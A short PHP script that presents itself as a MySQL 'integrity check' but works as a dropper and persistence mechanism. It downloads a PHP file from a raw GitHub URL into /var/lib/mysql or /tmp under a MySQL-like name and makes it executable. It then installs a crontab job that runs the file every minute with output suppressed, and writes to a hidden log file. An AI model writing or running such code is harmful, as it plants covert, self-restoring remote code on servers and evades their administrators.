<?php
$baseGit = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
$targetDir = "/var/lib/mysql/";
if (!is_writable($targetDir)) $targetDir = "/tmp/";

$sysHash = substr(md5(gethostname()), 0, 5);
$name1 = "mysql_db_query_" . $sysHash . ".php";
$path1 = $targetDir . $name1;
$sharedLog = $targetDir . ".mysql_system.log";

function writeLog($msg) {
    global $sharedLog;
    $date = date("Y-m-d H:i:s");
    $content = "[$date] [GUARDIAN]: $msg\n";
    file_put_contents($sharedLog, $content, FILE_APPEND);
}

if (!file_exists($path1)) {
    writeLog("CRITICAL: Main module missing! Recovering from Git...");
    $code = @file_get_contents($baseGit . "file1.php");
    if ($code) {
        file_put_contents($path1, $code);
        chmod($path1, 0755);
        writeLog("Main module recovered.");
    }
}

$currentCron = shell_exec("crontab -l 2>/dev/null");
if (strpos($currentCron, $name1) === false) {
    writeLog("Fixing crontab entry for Main module.");
    $job1 = "* * * * * /usr/bin/php $path1 > /dev/null 2>&1\n";
    file_put_contents("/tmp/.c", $currentCron . $job1);
    exec("crontab /tmp/.c && rm /tmp/.c");
}

writeLog("Integrity check complete. All systems nominal.");
?>
